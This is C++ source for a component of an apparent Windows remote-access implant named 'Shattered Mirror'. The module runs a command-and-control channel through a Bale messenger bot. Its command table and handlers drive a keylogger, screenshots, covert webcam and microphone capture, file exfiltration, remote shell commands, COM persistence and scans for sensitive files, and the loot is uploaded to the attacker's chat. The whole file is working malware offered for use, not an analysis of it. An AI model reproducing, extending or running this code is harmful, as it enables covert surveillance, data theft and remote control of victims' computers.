/*=============================================================================
 * Shattered Mirror v1 — Atom 12: Bale Bot Client (Secondary C2)
 * OPTION B: Dual pipes – command pipe (unused) and report pipe.
 * FIXED: Blocking read in report listener thread ensures no missed reports.
 *===========================================================================*/

#include "Atom_12_Bale.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <shlwapi.h>
#include <string>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")

/*===========================================================================
 * Configuration Constants
 *===========================================================================*/
#define BALE_API_HOST L"tapi.bale.ai"
#define BALE_API_PORT 443
#define BALE_TEMP_DIR L"log"
#define BALE_MAX_FILE_SIZE (50 * 1024 * 1024)
#define BALE_POLL_TIMEOUT 30
#define BALE_REPLY_TIMEOUT 15000
#define BALE_REPLY_TIMEOUT_LONG 30000

/*===========================================================================
 * Command Table Entry
 *===========================================================================*/
struct Command {
  const char *name;
  const char *description;
  int atomId;
  bool requiresPayload;
  void (*handler)(const std::string &args);
};

static void HandleHelp(const std::string &args);
static void HandleOnline(const std::string &args);
static void HandleSysinfo(const std::string &args);
static void HandleScreenshot(const std::string &args);
static void HandleKeylogStart(const std::string &args);
static void HandleKeylogFlush(const std::string &args);
static void HandleKeylogStop(const std::string &args);
static void HandleExfil(const std::string &args);
static void HandlePersist(const std::string &args);
static void HandleProcList(const std::string &args);
static void HandleScan(const std::string &args);
static void HandleScanFlush(const std::string &args);
static void HandlePing(const std::string &args);
static void HandleShell(const std::string &args);
static void HandleAmsiStatus(const std::string &args);
static void HandleSetDomain(const std::string &args);
static void HandleSpyCam(const std::string &args);
static void HandleSpyMic(const std::string &args);
static void HandleSpyBoth(const std::string &args);
static void HandleStopAtom(const std::string &args);
static void HandleListAtoms(const std::string &args);

/*===========================================================================
 * Global State
 *===========================================================================*/
static HANDLE g_hReportPipe =
    NULL; // For sending spawn requests & receiving forwarded reports
static HANDLE g_hCmdPipe = NULL; // Unused in Bale, but kept for symmetry
static BYTE g_SessionKey[16];
static std::string g_LastUpdateId = "0";
static DWORD g_LastKeylogSpamTime = 0;
static int g_KeylogSpamCount = 0;

/*===========================================================================
 * Command Table
 *===========================================================================*/
static const Command g_Commands[] = {
    {"/help", "Show this help", 0, false, HandleHelp},
    {"/online", "Show implant status", 0, false, HandleOnline},
    {"/sysinfo", "Collect system information", 3, false, HandleSysinfo},
    {"/screenshot", "Capture screen and upload", 6, false, HandleScreenshot},
    {"/keylog_start", "Start keylogger", 2, false, HandleKeylogStart},
    {"/keylog_flush", "Flush and return keystrokes", 2, false,
     HandleKeylogFlush},
    {"/keylog_stop", "Stop keylogger", 2, false, HandleKeylogStop},
    {"/exfil", "Exfiltrate a file", 5, true, HandleExfil},
    {"/persist", "Install COM persistence", 7, false, HandlePersist},
    {"/proc_list", "List running processes", 8, false, HandleProcList},
    {"/scan", "Scan directory for sensitive files", 9, true, HandleScan},
    {"/scan_flush", "Flush current scan log and send as file", 9, false, HandleScanFlush},
    {"/ping", "Measure round‑trip time", 11, false, HandlePing},
    {"/shell", "Execute a shell command", 10, true, HandleShell},
    {"/amsi_status", "Check AMSI bypass state", 4, false, HandleAmsiStatus},
    {"/set_domain", "Set the primary C2 domain (e.g., /set_domain ip:port)", 1, true, HandleSetDomain},
    {"/spy_cam", "Capture webcam snapshot", 14, false, HandleSpyCam},
    {"/spy_mic", "Record 30s of audio", 14, false, HandleSpyMic},
    {"/spy_both", "Capture webcam and audio", 14, false, HandleSpyBoth},
    {"/stop_atom", "Stop an atom by ID (e.g., /stop_atom 2)", 0, true,
     HandleStopAtom},
    {"/list_atoms", "List running atoms", 0, false, HandleListAtoms},
};
static const int g_CommandCount = sizeof(g_Commands) / sizeof(g_Commands[0]);

/*===========================================================================
 * Debug Logging
 *===========================================================================*/
static void DebugLog(const char *format, ...) {
  char buf[2048];
  va_list args;
  va_start(args, format);
  vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  FILE *f = fopen("log\\bale_debug.txt", "a");
  if (f) {
    fprintf(f, "%s\n", buf);
    fclose(f);
  }
}

/*===========================================================================
 * JSON Escaping
 *===========================================================================*/
static std::string JsonEscape(const std::string &s) {
  std::string out;
  for (char c : s) {
    switch (c) {
    case '\n':
      out += "\\n";
      break;
    case '\r':
      out += "\\r";
      break;
    case '\"':
      out += "\\\"";
      break;
    case '\\':
      out += "\\\\";
      break;
    default:
      out += c;
      break;
    }
  }
  return out;
}

/*===========================================================================
 * WinHTTP Helpers
 *===========================================================================*/
static std::string HttpRequest(const std::wstring &method,
                               const std::wstring &path,
                               const std::string &body = "") {
  DebugLog("[HTTP] %ls %ls", method.c_str(), path.c_str());
  if (!body.empty())
    DebugLog("[HTTP] Body: %s", body.c_str());

  HINTERNET hSession = WinHttpOpen(
      L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession) {
    DebugLog("[HTTP] WinHttpOpen failed: %lu", GetLastError());
    return "";
  }

  HINTERNET hConnect =
      WinHttpConnect(hSession, BALE_API_HOST, BALE_API_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return "";
  }

  DWORD flags = (BALE_API_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
  HINTERNET hRequest = WinHttpOpenRequest(
      hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, flags);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return "";
  }

  std::wstring headers = L"Content-Type: application/json\r\n";
  BOOL bSend = body.empty()
                   ? WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)
                   : WinHttpSendRequest(
                         hRequest, headers.c_str(), -1, (LPVOID)body.c_str(),
                         (DWORD)body.length(), (DWORD)body.length(), 0);

  std::string response;
  if (bSend && WinHttpReceiveResponse(hRequest, NULL)) {
    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(
        hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
    DebugLog("[HTTP] Status: %lu", status);
    DWORD dwSize = 0;
    char buf[8192];
    DWORD dwRead = 0;
    while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
      if (dwSize > sizeof(buf) - 1)
        dwSize = sizeof(buf) - 1;
      if (WinHttpReadData(hRequest, buf, dwSize, &dwRead)) {
        buf[dwRead] = '\0';
        response += buf;
      }
    }
  } else {
    DebugLog("[HTTP] Send/Receive failed: %lu", GetLastError());
  }
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  if (response.length() > 500)
    DebugLog("[HTTP] Response: %.500s...", response.c_str());
  else
    DebugLog("[HTTP] Response: %s", response.c_str());
  return response;
}

static std::string HttpGet(const std::wstring &path) {
  return HttpRequest(L"GET", path);
}
static std::string HttpPost(const std::wstring &path,
                            const std::string &jsonBody) {
  return HttpRequest(L"POST", path, jsonBody);
}

/*===========================================================================
 * Telegram API Wrappers
 *===========================================================================*/
static BOOL SendTelegramMessage(const std::string &text) {
  std::wstring path =
      L"/bot" +
      std::wstring(Config::BALE_BOT_TOKEN,
                   Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN)) +
      L"/sendMessage";
  std::string json = "{\"chat_id\":\"" + std::string(Config::BALE_CHAT_ID) +
                     "\",\"text\":\"" + JsonEscape(text) + "\"}";
  std::string resp = HttpPost(path, json);
  return resp.find("\"ok\":true") != std::string::npos;
}

static void SendLargeMessage(const std::string &text) {
  const size_t MAX_LEN = 4000;
  if (text.length() <= MAX_LEN) {
    SendTelegramMessage(text);
    return;
  }
  size_t pos = 0;
  int part = 1;
  while (pos < text.length()) {
    size_t len = min(MAX_LEN, text.length() - pos);
    SendTelegramMessage("[" + std::to_string(part) + "] " +
                        text.substr(pos, len));
    pos += len;
    part++;
    if (pos < text.length())
      Sleep(500);
  }
}

static BOOL UploadFileToTelegram(const std::wstring &filePath,
                                 const std::string &caption = "") {
  DebugLog("[UPLOAD] Uploading %ls", filePath.c_str());
  HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    DebugLog("[UPLOAD] Cannot open file: %lu", GetLastError());
    return FALSE;
  }
  DWORD fileSize = GetFileSize(hFile, NULL);
  if (fileSize == 0 || fileSize > BALE_MAX_FILE_SIZE) {
    CloseHandle(hFile);
    return FALSE;
  }
  BYTE *fileData = (BYTE *)HeapAlloc(GetProcessHeap(), 0, fileSize);
  if (!fileData) {
    CloseHandle(hFile);
    return FALSE;
  }
  DWORD read;
  ReadFile(hFile, fileData, fileSize, &read, NULL);
  CloseHandle(hFile);

  std::string boundary = "----ShatteredMirrorBoundary";
  std::string body;
  body += "--" + boundary +
          "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
          std::string(Config::BALE_CHAT_ID) + "\r\n";
  if (!caption.empty())
    body += "--" + boundary +
            "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" +
            caption + "\r\n";
  char fileNameA[MAX_PATH];
  WideCharToMultiByte(CP_UTF8, 0, PathFindFileNameW(filePath.c_str()), -1,
                      fileNameA, sizeof(fileNameA), NULL, NULL);
  body += "--" + boundary +
          "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" +
          std::string(fileNameA) +
          "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
  std::string footer = "\r\n--" + boundary + "--\r\n";
  DWORD totalSize = (DWORD)body.length() + fileSize + (DWORD)footer.length();
  BYTE *postData = (BYTE *)HeapAlloc(GetProcessHeap(), 0, totalSize);
  if (!postData) {
    HeapFree(GetProcessHeap(), 0, fileData);
    return FALSE;
  }
  memcpy(postData, body.c_str(), body.length());
  memcpy(postData + body.length(), fileData, fileSize);
  memcpy(postData + body.length() + fileSize, footer.c_str(), footer.length());
  HeapFree(GetProcessHeap(), 0, fileData);

  HINTERNET hSession = WinHttpOpen(
      L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession) {
    HeapFree(GetProcessHeap(), 0, postData);
    return FALSE;
  }
  HINTERNET hConnect =
      WinHttpConnect(hSession, BALE_API_HOST, BALE_API_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    HeapFree(GetProcessHeap(), 0, postData);
    return FALSE;
  }
  std::wstring path =
      L"/bot" +
      std::wstring(Config::BALE_BOT_TOKEN,
                   Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN)) +
      L"/sendDocument";
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL,
                                          NULL, NULL, WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    HeapFree(GetProcessHeap(), 0, postData);
    return FALSE;
  }
  std::wstring headers = L"Content-Type: multipart/form-data; boundary=" +
                         std::wstring(boundary.begin(), boundary.end()) +
                         L"\r\n";
  BOOL bSuccess = WinHttpSendRequest(hRequest, headers.c_str(), -1, postData,
                                     totalSize, totalSize, 0);
  if (bSuccess)
    WinHttpReceiveResponse(hRequest, NULL);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  HeapFree(GetProcessHeap(), 0, postData);
  return bSuccess;
}

/*===========================================================================
 * IPC Helpers
 *===========================================================================*/
static BOOL SendSpawnRequest(int atomId, const std::string &payload) {
  if (!g_hReportPipe) {
    DebugLog("[SPAWN] No report pipe");
    return FALSE;
  }
  std::string req =
      std::to_string(atomId) + (payload.empty() ? "" : ":" + payload);
  IPC_MESSAGE msg = {0};
  msg.dwSignature = 0x534D4952;
  msg.CommandId = CMD_SPAWN_ATOM;
  msg.dwPayloadLen = (DWORD)req.length();
  memcpy(msg.Payload, req.c_str(), req.length());
  DebugLog("[SPAWN] Sending: %s", req.c_str());
  return IPC_SendMessage(g_hReportPipe, &msg, g_SessionKey, 16);
}

static BOOL SendStopRequest(int atomId) {
  return SendSpawnRequest(atomId, "STOP");
}

/*===========================================================================
 * Process a single forwarded report (called by listener thread)
 *===========================================================================*/
static void ProcessForwardedReport(DWORD atomId, const std::string &data) {
  DebugLog("[LISTENER] Processing report from Atom %d: %s", atomId,
           data.c_str());

  // Ignore ACK/NACK/STOPPED messages
  if (data.find("ACK:") == 0 || data.find("NACK:") == 0 ||
      data.find("STOPPED:") == 0)
    return;

  // Keylogger spam filter
  if (atomId == 2) {
    DWORD now = GetTickCount();
    if (now - g_LastKeylogSpamTime < 2000) {
      g_KeylogSpamCount++;
      if (g_KeylogSpamCount > 5) {
        if (g_KeylogSpamCount == 6)
          SendTelegramMessage("[Keylogger] Suppressing further spam...");
        return;
      }
    } else {
      g_KeylogSpamCount = 0;
    }
    g_LastKeylogSpamTime = now;
  }

  if (data.find("[SCREENSHOT_READY]") == 0) {
    std::string pathA = data.substr(strlen("[SCREENSHOT_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    if (UploadFileToTelegram(path, "Screenshot")) {
      SendTelegramMessage("Screenshot sent.");
      DeleteFileW(path.c_str());
    } else {
      SendTelegramMessage("Screenshot upload failed.");
    }
  } else if (data.find("[EXFIL_READY]") == 0) {
    std::string pathA = data.substr(strlen("[EXFIL_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    if (UploadFileToTelegram(path, "Exfiltrated file")) {
      SendTelegramMessage("File sent.");
      DeleteFileW(path.c_str());
    } else {
      SendTelegramMessage("File upload failed.");
    }
  } else if (data.find("[FS_READY]") == 0) {
    std::string pathA = data.substr(strlen("[FS_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    if (UploadFileToTelegram(path, "Scan Results (Full)")) {
      SendTelegramMessage("Scan report sent.");
      DeleteFileW(path.c_str());
    } else {
      SendTelegramMessage("Scan report upload failed.");
    }
  } else if (data.find("[FS_FLUSH_READY]") == 0) {
    std::string pathA = data.substr(strlen("[FS_FLUSH_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    if (UploadFileToTelegram(path, "Scan Results (Partial Flush)")) {
      SendTelegramMessage("Partial scan report flushed and sent.");
    } else {
      SendTelegramMessage("Flush upload failed.");
    }
  } else if (data.find("[SPY_CAM_READY]") == 0) {
    std::string pathA = data.substr(strlen("[SPY_CAM_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    if (UploadFileToTelegram(path, "Spy Cam Snapshot")) {
      DeleteFileW(path.c_str());
    }
  } else if (data.find("[SPY_MIC_READY]") == 0) {
    std::string pathA = data.substr(strlen("[SPY_MIC_READY] "));
    std::wstring path(pathA.begin(), pathA.end());
    if (UploadFileToTelegram(path, "Spy Mic Recording (30s)")) {
      DeleteFileW(path.c_str());
    }
  } else if (data.find("[ERROR]") == 0 || data.find("[FATAL]") == 0 || data.find("[WARN]") == 0) {
    char header[64];
    sprintf_s(header, "⚠️ Atom Alert (%lu):\n", atomId);
    SendTelegramMessage(std::string(header) + data);
  } else {
    // If it's a small text report, send it as a message
    if (data.length() < 1024) {
       char header[64];
       sprintf_s(header, "Atom %lu report:\n", atomId);
       SendTelegramMessage(std::string(header) + data);
    }
  }
}

/*===========================================================================
 * Blocking Report Listener Thread (FIX: No polling, reads immediately)
 *===========================================================================*/
DWORD WINAPI ReportListenerThread(LPVOID) {
  DebugLog("[LISTENER] Report listener thread started (blocking read).");
  while (TRUE) {
    IPC_MESSAGE msg = {0};
    if (IPC_ReceiveMessage(g_hReportPipe, &msg, g_SessionKey, 16)) {
      if (msg.CommandId == CMD_FORWARD_REPORT) {
        std::string data((char *)msg.Payload, msg.dwPayloadLen);
        ProcessForwardedReport(msg.AtomId, data);
      }
    } else {
      DWORD err = GetLastError();
      if (err == ERROR_BROKEN_PIPE) {
        DebugLog("[LISTENER] Pipe broken, exiting.");
        break;
      }
    }
    Sleep(100);
  }
  return 0;
}

DWORD WINAPI CommandListenerThread(LPVOID) {
  DebugLog("[LISTENER] Command listener thread started.");
  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(g_hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(g_hCmdPipe, &inMsg, g_SessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          DebugLog("[CMD] Received CMD_EXECUTE from console, sending Online status.");
          HandleOnline("");
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          DebugLog("[CMD] Received CMD_TERMINATE. Exiting.");
          ExitProcess(0); // Optional: cleaner exit
        }
      }
    }
    Sleep(500);
  }
  return 0;
}

/*===========================================================================
 * Command Handlers
 *===========================================================================*/
static void HandleHelp(const std::string &args) {
  std::string help = "Commands:\n";
  for (int i = 0; i < g_CommandCount; i++)
    help += std::string(g_Commands[i].name) + " - " +
            g_Commands[i].description + "\n";
  SendLargeMessage(help);
}
static void HandleOnline(const std::string &args) {
  char host[256] = {0}, user[256] = {0};
  DWORD sz = sizeof(host);
  GetComputerNameA(host, &sz);
  sz = sizeof(user);
  GetUserNameA(user, &sz);
  SendTelegramMessage("🟢 Online\nHost: " + std::string(host) +
                      "\nUser: " + std::string(user));
}
static void HandleSysinfo(const std::string &args) {
  if (SendSpawnRequest(3, "RUN"))
    Sleep(100); /* listener will catch report */
}
static void HandleScreenshot(const std::string &args) {
  if (SendSpawnRequest(6, "BALE_RUN"))
    SendTelegramMessage("Screenshot triggered...");
}
static void HandleKeylogStart(const std::string &args) {
  SendSpawnRequest(2, "START");
  SendTelegramMessage("Keylogger started.");
}
static void HandleKeylogFlush(const std::string &args) {
  if (SendSpawnRequest(2, "FLUSH"))
    Sleep(100);
}
static void HandleKeylogStop(const std::string &args) {
  SendSpawnRequest(2, "FLUSH"); // Flush one last time
  Sleep(500);
  SendStopRequest(2);
  SendTelegramMessage("Keylogger stopped and flushed.");
}
static void HandleExfil(const std::string &args) {
  if (args.empty())
    SendTelegramMessage("Usage: /exfil <path>");
  else {
    SendSpawnRequest(5, args);
    Sleep(100);
  }
}
static void HandlePersist(const std::string &args) {
  SendSpawnRequest(7, "RUN");
  SendTelegramMessage("Persistence queued.");
}
static void HandleProcList(const std::string &args) {
  if (SendSpawnRequest(8, "RUN"))
    Sleep(100);
}
static void HandleScan(const std::string &args) {
  std::string path = args.empty() ? "C:\\Users" : args;
  if (SendSpawnRequest(9, path)) {
    SendTelegramMessage("Scan started on: " + path);
  }
}
static void HandleScanFlush(const std::string &args) {
  if (SendSpawnRequest(9, "FLUSH"))
    SendTelegramMessage("Scan flush triggered...");
}
static void HandlePing(const std::string &args) {
  if (SendSpawnRequest(11, "RUN"))
    Sleep(100);
}
static void HandleShell(const std::string &args) {
  if (args.empty())
    SendTelegramMessage("Usage: /shell <cmd>");
  else {
    SendSpawnRequest(10, args);
    Sleep(100);
  }
}
static void HandleAmsiStatus(const std::string &args) {
  if (SendSpawnRequest(4, "RUN"))
    Sleep(100);
}
static void HandleSetDomain(const std::string &args) {
  if (args.empty()) {
    SendTelegramMessage("Usage: /set_domain <ip>:<port>");
  } else {
    // We package the command for Atom 1 (Net) to catch
    std::string payload = "SET_DOMAIN:" + args;
    SendSpawnRequest(1, payload); 
    SendTelegramMessage("Command sent to update Primary Domain to: " + args);
    Sleep(100);
  }
}
static void HandleSpyCam(const std::string &args) {
    SendSpawnRequest(14, "BALE_CAM");
    SendTelegramMessage("Spy Cam triggered.");
}
static void HandleSpyMic(const std::string &args) {
    SendSpawnRequest(14, "BALE_MIC");
    SendTelegramMessage("Spy Mic triggered (30s).");
}
static void HandleSpyBoth(const std::string &args) {
    SendSpawnRequest(14, "BALE_BOTH");
    SendTelegramMessage("Spy Cam + Mic triggered.");
}
static void HandleStopAtom(const std::string &args) {
  if (args.empty()) {
    SendTelegramMessage("Usage: /stop_atom <id>");
    return;
  }
  int id = atoi(args.c_str());
  if (id < 1 || id > 12) {
    SendTelegramMessage("Invalid atom ID (1-12).");
    return;
  }
  SendStopRequest(id);
  SendTelegramMessage("Stop request sent for Atom " + std::to_string(id));
}
static void HandleListAtoms(const std::string &args) {
  SendTelegramMessage("Check console or logs for running atoms.");
}

/*===========================================================================
 * Telegram Polling Helpers
 *===========================================================================*/
static bool ParseUpdates(const std::string &response, std::string &outCommand,
                         std::string &outArgs) {
  outCommand.clear();
  outArgs.clear();
  if (response.empty())
    return false;
  size_t maxId = 0, pos = 0;
  while ((pos = response.find("\"update_id\":", pos)) != std::string::npos) {
    pos += 12;
    size_t end = response.find_first_of(",}", pos);
    if (end == std::string::npos)
      break;
    maxId = max(maxId, std::stoull(response.substr(pos, end - pos)));
    pos = end;
  }
  if (maxId > 0)
    g_LastUpdateId = std::to_string(maxId + 1);

  size_t textPos = response.rfind("\"text\":\"");
  if (textPos == std::string::npos)
    return false;
  size_t start = textPos + 8;
  size_t end = response.find("\"", start);
  if (end == std::string::npos)
    return false;
  std::string text = response.substr(start, end - start);

  size_t escPos = 0;
  while ((escPos = text.find("\\n", escPos)) != std::string::npos) {
    text.replace(escPos, 2, "\n");
    escPos += 1;
  }
  escPos = 0;
  while ((escPos = text.find("\\\"", escPos)) != std::string::npos) {
    text.replace(escPos, 2, "\"");
    escPos += 1;
  }

  text.erase(text.begin(),
             std::find_if(text.begin(), text.end(),
                          [](unsigned char ch) { return !std::isspace(ch); }));
  text.erase(std::find_if(text.rbegin(), text.rend(),
                          [](unsigned char ch) { return !std::isspace(ch); })
                 .base(),
             text.end());

  DebugLog("[POLL] Raw text: '%s'", text.c_str());
  if (!text.empty() && text[0] == '/') {
    size_t spacePos = text.find(' ');
    if (spacePos != std::string::npos) {
      outCommand = text.substr(0, spacePos);
      outArgs = text.substr(spacePos + 1);
      outArgs.erase(
          outArgs.begin(),
          std::find_if(outArgs.begin(), outArgs.end(),
                       [](unsigned char ch) { return !std::isspace(ch); }));
    } else {
      outCommand = text;
    }
    DebugLog("[POLL] Command: '%s', Args: '%s'", outCommand.c_str(),
             outArgs.c_str());
    return true;
  }
  return false;
}

static void SkipOldUpdates() {
  std::wstring basePath =
      L"/bot" +
      std::wstring(Config::BALE_BOT_TOKEN,
                   Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN));
  std::wstring path = basePath + L"/getUpdates?offset=-1&timeout=1";
  std::string response = HttpGet(path);
  if (response.empty())
    return;
  size_t maxId = 0, pos = 0;
  while ((pos = response.find("\"update_id\":", pos)) != std::string::npos) {
    pos += 12;
    size_t end = response.find_first_of(",}", pos);
    if (end == std::string::npos)
      break;
    DWORD id = (DWORD)std::stoul(response.substr(pos, end - pos));
    if (id > maxId)
      maxId = id;
    pos = end;
  }
  if (maxId > 0) {
    g_LastUpdateId = std::to_string(maxId + 1);
    DebugLog("[INIT] Skipped old updates. Next offset = %s",
             g_LastUpdateId.c_str());
  }
}

/*===========================================================================
 * Bot Polling Loop
 *===========================================================================*/
static void BotPollLoop() {
  std::wstring basePath =
      L"/bot" +
      std::wstring(Config::BALE_BOT_TOKEN,
                   Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN));
  while (TRUE) {
    std::wstring path =
        basePath + L"/getUpdates?offset=" +
        std::wstring(g_LastUpdateId.begin(), g_LastUpdateId.end()) +
        L"&timeout=" + std::to_wstring(BALE_POLL_TIMEOUT);
    std::string response = HttpGet(path);
    if (!response.empty()) {
      size_t pos = 0;
      while ((pos = response.find("\"message\":{", pos)) != std::string::npos) {
        // Find the text for THIS message
        size_t textPos = response.find("\"text\":\"", pos);
        if (textPos != std::string::npos) {
          size_t start = textPos + 8;
          size_t end = response.find("\"", start);
          if (end != std::string::npos) {
            std::string text = response.substr(start, end - start);
            // Quick unescape and trim (inline to keep it simple)
            size_t escPos = 0;
            while ((escPos = text.find("\\n", escPos)) != std::string::npos) { text.replace(escPos, 2, "\n"); escPos += 1; }
            escPos = 0;
            while ((escPos = text.find("\\\"", escPos)) != std::string::npos) { text.replace(escPos, 2, "\""); escPos += 1; }
            text.erase(text.begin(), std::find_if(text.begin(), text.end(), [](unsigned char ch) { return !std::isspace(ch); }));
            text.erase(std::find_if(text.rbegin(), text.rend(), [](unsigned char ch) { return !std::isspace(ch); }).base(), text.end());

            if (!text.empty() && text[0] == '/') {
              std::string cmd, args;
              size_t spacePos = text.find(' ');
              if (spacePos != std::string::npos) {
                cmd = text.substr(0, spacePos);
                args = text.substr(spacePos + 1);
                args.erase(args.begin(), std::find_if(args.begin(), args.end(), [](unsigned char ch) { return !std::isspace(ch); }));
              } else {
                cmd = text;
              }
              DebugLog("[POLL] Processing Command: '%s'", cmd.c_str());
              bool found = false;
              for (int i = 0; i < g_CommandCount; i++) {
                if (cmd == g_Commands[i].name) {
                  g_Commands[i].handler(args);
                  found = true;
                  break;
                }
              }
              if (!found) SendTelegramMessage("Unknown command: " + cmd);
            }
          }
        }
        // Move to next message
        pos += 10; 
      }
      // Update offset for next poll
      size_t idPos = 0;
      long long maxId = -1;
      while ((idPos = response.find("\"update_id\":", idPos)) != std::string::npos) {
        idPos += 12;
        size_t idEnd = response.find_first_of(",}", idPos);
        if (idEnd != std::string::npos) {
          long long id = std::stoll(response.substr(idPos, idEnd - idPos));
          if (id > maxId) maxId = id;
        }
      }
      if (maxId != -1) g_LastUpdateId = std::to_string(maxId + 1);
    }
    Sleep(2000);
  }
}

/*===========================================================================
 * Main Entry Point (Dual Pipes)
 *===========================================================================*/
DWORD WINAPI BaleBotAtomMain(LPVOID lpParam) {
  DebugLog("=== Atom 12 Bale Bot Starting (Pull‑Based Version) ===");
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  // Removed global CWD change to prevent breaking other atoms' file IO

  // Connect to command pipe (unused but required for symmetry)
  g_hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!g_hCmdPipe) {
    DebugLog("[WARN] IPC_ConnectToCommandPipe failed: %lu (continuing)",
             GetLastError());
  } else {
    DebugLog("[INIT] Command pipe connected. Handle=%p", g_hCmdPipe);
  }

  // Connect to report pipe (critical)
  g_hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!g_hReportPipe) {
    DebugLog("[FATAL] IPC_ConnectToReportPipe failed: %lu", GetLastError());
    if (g_hCmdPipe)
      CloseHandle(g_hCmdPipe);
    return 1;
  }
  DebugLog("[INIT] Report pipe connected. Handle=%p", g_hReportPipe);

  memcpy(g_SessionKey, Config::PSK_ID, 16);

  SkipOldUpdates();
  HandleOnline("");

  // Start report listener thread (blocking read, no polling)
  CreateThread(NULL, 0, ReportListenerThread, NULL, 0, NULL);
  DebugLog("[LISTENER] Report listener thread launched.");

  // Start command listener thread for manual console triggers
  if (g_hCmdPipe) {
    CreateThread(NULL, 0, CommandListenerThread, NULL, 0, NULL);
    DebugLog("[LISTENER] Command listener thread launched.");
  }

  BotPollLoop();

  if (g_hCmdPipe)
    CloseHandle(g_hCmdPipe);
  CloseHandle(g_hReportPipe);
  return 0;
}